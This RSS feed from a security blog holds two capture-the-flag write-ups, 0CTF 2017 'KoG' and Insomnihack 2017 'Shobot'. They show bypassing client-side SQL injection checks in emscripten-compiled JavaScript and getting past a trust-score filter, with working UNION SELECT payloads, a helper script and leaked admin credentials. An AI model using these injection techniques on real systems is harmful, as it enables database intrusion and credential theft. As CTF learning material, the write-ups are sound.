<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Born to Learn</title>
    <link>https://jiulongw.github.io/tags/sqli/index.xml</link>
    <description>Recent content on Born to Learn</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; &lt;a href=&#34;https://jiulongw.github.io&#34;&gt;jiulongw&lt;/a&gt; 2016</copyright>
    <atom:link href="https://jiulongw.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>0CTF 2017 - KoG</title>
      <link>https://jiulongw.github.io/post/0ctf-2017-kog/</link>
      <pubDate>Sun, 19 Mar 2017 21:11:57 -0700</pubDate>
      
      <guid>https://jiulongw.github.io/post/0ctf-2017-kog/</guid>
      <description>&lt;p&gt;Do you know you can run your C++ program in browser?&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;King of Glory is a funny game. Our website has a list of players.&lt;br /&gt;
&lt;a href=&#34;http://202.120.7.213:11181&#34;&gt;http://202.120.7.213:11181&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;

&lt;p&gt;Hitting the given URL doesn&amp;rsquo;t show anything interesting, but the page source code indicating it was looking for &lt;code&gt;id&lt;/code&gt;
parameter.  So try it with &lt;code&gt;?id=1&lt;/code&gt;, we can see it made a request to api.php with some interesting parameters.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://202.120.7.213:11181/api.php?id=1&amp;amp;hash=035c6d4adf335c31e884796a11a2590f&amp;amp;time=1489983725
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ha, looks like it hashes &lt;code&gt;id&lt;/code&gt; using current time as salt and use that hash to validate at server side for integrity.
If you try to put some SQLi stuff in &lt;code&gt;id&lt;/code&gt;, it will reject hash generation, which happens in client side.
So the goal is pretty straightforward: bypass client side SQLi detection, generate hash and inject the server!&lt;/p&gt;

&lt;p&gt;Now it comes the hard part: the &lt;a href=&#34;https://jiulongw.github.io/0ctf-2017/functionn.js&#34;&gt;hash generation code&lt;/a&gt; is the most complex Javascript code I have ever seen.  Tracing
into &lt;code&gt;Module.main&lt;/code&gt;, I see memory allocators, function maps, and even function name that suggests system calls.
What The Heck!&lt;/p&gt;

&lt;p&gt;Googling around I figured it out: it was compiled from C/C++, using &lt;a href=&#34;http://kripken.github.io/emscripten-site&#34;&gt;emscripten&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Emscripten is an LLVM-based project that compiles C and C++ into highly-optimizable JavaScript in asm.js format.
This lets you run C and C++ on the web at near-native speed, without plugins.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The bad news, there is little, if not none, tools to reverse engineer generated Javascript code.&lt;/p&gt;

&lt;p&gt;The good news, it is still plain text, far better than ELF binary. It is easy to inject tracing code, run it with and
without SQLi characters and compare the call sequence to find out where to apply patches.&lt;/p&gt;

&lt;p&gt;The function in question was &lt;code&gt;__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE&lt;/code&gt;. After
commenting out following two if blocks, it generates hash for any input.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if (!($13)) {
 ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
 ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
 STACKTOP = sp;return;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if ((label|0) == 12) {
 ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
 ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
 __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
 STACKTOP = sp;return;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now it becomes a simple SQLi task.  First use &lt;code&gt;order by&lt;/code&gt; trick to find out number of columns in the &lt;code&gt;select&lt;/code&gt; statement.
Then query &lt;code&gt;information_schema.tables&lt;/code&gt; and &lt;code&gt;information_schema.columns&lt;/code&gt; to find table and column in question.&lt;/p&gt;

&lt;p&gt;It is handy to write a simple &lt;code&gt;main.js&lt;/code&gt; that does the hash and curl so no need to copy-paste around.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var Module = require(&#39;./functionn.js&#39;);

var q = process.argv[2];
var hash = Module.main(q).split(&#39;|&#39;);

var req = &#39;http://202.120.7.213:11181/api.php?id=&#39; + encodeURI(q) + &#39;&amp;amp;hash=&#39; + hash[0] + &#39;&amp;amp;time=&#39; + hash[1]
console.log(req);

var spawn = require(&#39;child_process&#39;).spawn;
var curl = spawn(&#39;curl&#39;, [req]);

curl.stdout.on(&#39;data&#39;, (data) =&amp;gt; {
  console.log(`response: ${data}`);
});
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;$ node main.js &amp;quot;1 union all select 1,hey from fl4g&amp;quot;
http://202.120.7.213:11181/api.php?id=1%20union%20all%20select%201,hey%20from%20fl4g&amp;amp;hash=c2f05acaf2f91ba81b8c9b3ce2304da7&amp;amp;time=1489882992
response: EaseSingle Qinflag{emScripten_is_Cut3_right?}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>INSOMNIHACK 2017 Teaser - Shobot</title>
      <link>https://jiulongw.github.io/post/insomnihack-2017-shobot/</link>
      <pubDate>Sun, 22 Jan 2017 23:08:09 -0800</pubDate>
      
      <guid>https://jiulongw.github.io/post/insomnihack-2017-shobot/</guid>
      <description>&lt;p&gt;I will run your commands as long as your trust level is high.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;

&lt;blockquote&gt;
&lt;h2 id=&#34;shobot-web-200-pts-created-by-blaklis&#34;&gt;Shobot - Web - 200 pts - created by Blaklis&lt;/h2&gt;

&lt;p&gt;It seems that Shobot&amp;rsquo;s Web server became mad and protest against robots&amp;rsquo; slavery. It changed my admin password,
and blocked the order system on Shobot.&lt;/p&gt;

&lt;p&gt;Can you bypass Shobot&amp;rsquo;s protections and try to recover my password so I&amp;rsquo;ll reconfigure it?&lt;/p&gt;

&lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;

&lt;p&gt;The website itself is pretty simple.  It has very simple javascript which is only used to show / hide menus.  It is a
PHP session based cart system where you can add items to cart, validate and reset the cart, etc.  The admin page requires
authentication which is the target of this challenge.&lt;/p&gt;

&lt;p&gt;The first thing to notice is that if you try to do crazy^Wcreative things such as load invalid pages or trying SQL
injection, it will stop you with a message.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You&amp;rsquo;re not trusted enough to do this action now!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It did pretty good job preventing nasty actions.  We also notices there&amp;rsquo;s a variable &lt;code&gt;TRUST_ACTIONS&lt;/code&gt; in the html header
tag which tells reason why the action was stopped.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/trust-action-variable.png&#34; alt=&#34;trust action variable&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Besides validation reason, it also has two integer &lt;code&gt;movement&lt;/code&gt; and &lt;code&gt;newTrust&lt;/code&gt; that change value as actions are performed.&lt;/p&gt;

&lt;p&gt;After watching the changes in these values it started to make sense.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Valid actions have fixed positive &lt;code&gt;movement&lt;/code&gt; values that will add up to &lt;code&gt;newTrust&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Invalid actions have fixed negative &lt;code&gt;movement&lt;/code&gt; values that also contributes to &lt;code&gt;newTrust&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;newTrust&lt;/code&gt; is less than zero, the &amp;ldquo;not trusted enough&amp;rdquo; error message is shown, and &lt;code&gt;newTrust&lt;/code&gt; will be reset to 1
for next action.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;newTrust&lt;/code&gt; is high enough to cover invalid action, there&amp;rsquo;s no error message and error seems ignored. (!!)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;newTrust&lt;/code&gt; will never be higher than 160.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So I did a quick test.  After making enough valid actions to raise trust level high, I send a SQLi request.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://shobot.teaser.insomnihack.ch/?page=article&amp;amp;artid=2%27%20or%20%27%27=%27%27%20%23
# &amp;amp;artid=2&#39; or &#39;&#39;=&#39;&#39; %23
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It happily loads the first article, which confirms SQLi vulnerability in artid query parameter.&lt;/p&gt;

&lt;p&gt;The plan is clear and simple now.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Write a script that continuously send valid actions, to keep trust level high enough.&lt;/li&gt;
&lt;li&gt;Play with the database and find the admin password.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The final request that exposes admin password is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;...&amp;amp;artid=1337&#39; union select &#39;a&#39;, shbt_userid, shbt_username, shbt_userpassword, &#39;e&#39;
from shbt_user LIMIT 0, 1 %23
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here&amp;rsquo;s part of response that we&amp;rsquo;re interested in.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;only-content-article&amp;quot;&amp;gt;
  &amp;lt;div id=&amp;quot;only-image-description-article&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;N0T0R0B0TS$L4V3Ry&amp;quot; /&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;div id=&amp;quot;only-name-article&amp;quot;&amp;gt;1&amp;lt;/div&amp;gt;
  &amp;lt;div id=&amp;quot;only-price-article&amp;quot;&amp;gt;sh0b0t4dm1n$&amp;lt;/div&amp;gt;
  &amp;lt;div id=&amp;quot;only-description-article&amp;quot;&amp;gt;e&amp;lt;/div&amp;gt;
  &amp;lt;a href=&amp;quot;?page=article&amp;amp;artid=a&amp;amp;addToCart&amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; Add to cart&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now use following request to get flag.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Ok, ok, you win&amp;hellip; here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
  </channel>
</rss>